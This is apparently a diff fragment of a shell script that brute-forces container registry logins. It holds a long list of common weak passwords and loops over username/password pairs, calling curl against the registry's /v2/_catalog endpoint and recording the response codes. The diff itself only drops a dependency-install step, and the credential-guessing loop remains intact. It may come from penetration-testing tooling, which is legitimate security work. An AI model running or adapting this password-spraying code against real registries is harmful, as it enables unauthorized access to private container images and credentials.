@@ -19,11 +19,7 @@ qwe123 7777777 qwerty123 target123 tinkle 987654321 qwerty1 222222 zxcvbnm 1g2w3
 777777 princess1 123654 11111 asdfgh 999999 11111111 passer2009 888888 love abcd1234 shadow football1 love123 superman jordan23 jessica monkey1 \
 12qwaszx a12345 baseball 123456789a killer asdf samsung master azerty charlie asd123 soccer fqrg7cs493 88888888 jordan testpassword"
 
-# Installing dependencies and setup
-apt-get update >/dev/null 2>&1
-apt-get install -y --no-install-recommends curl >/dev/null 2>&1
 mkdir -p "${OUTDIR}"
-
 for user in $USERNAMES; do
   for pass in $PASSWORDS; do
     code=$(curl -sk -u "$user:$pass" -o /dev/null -w '%{http_code}' https://$HOSTREGISTRY/v2/_catalog)
